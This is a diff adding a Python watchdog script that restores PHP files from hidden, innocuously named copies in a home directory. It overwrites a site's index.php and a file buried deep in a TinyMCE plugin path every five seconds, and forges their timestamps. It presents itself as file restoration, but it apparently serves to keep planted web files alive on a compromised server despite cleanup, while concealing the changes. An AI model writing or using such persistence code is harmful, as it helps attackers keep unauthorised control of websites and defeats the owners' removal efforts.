@@ -1,0 +1,48 @@
+import os
+import time
+import shutil
+import hashlib
+
+files_to_restore = [
+    {
+        "backup": "/home/adminnew/.local/core_error_2025.php",
+        "restore_to": "/home/apps/public_html/ocs/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/jbimages/ci/system/database/drivers/sqlite/manager/reload.php"
+    },
+    {
+        "backup": "/home/adminnew/.local/core_data_2025.php",
+        "restore_to": "/home/apps/public_html/index.php"
+    },
+]
+
+def file_hash(path):
+    if not os.path.exists(path):
+        return None
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        while True:
+            chunk = f.read(4096)
+            if not chunk:
+                break
+            h.update(chunk)
+    return h.hexdigest()
+
+while True:
+    try:
+        for file_pair in files_to_restore:
+            backup = file_pair["backup"]
+            restore_to = file_pair["restore_to"]
+
+            backup_hash = file_hash(backup)
+            target_hash = file_hash(restore_to)
+
+            if backup_hash is not None and (target_hash is None or target_hash != backup_hash):
+                shutil.copyfile(backup, restore_to)
+                bstat = os.stat(backup)
+                os.utime(restore_to, (bstat.st_atime, bstat.st_mtime))
+                print(f"[✓] File restored: {restore_to}")
+
+        time.sleep(5)
+
+    except Exception as e:
+        print(f"[!] ERROR: {e}")
+        time.sleep(5)
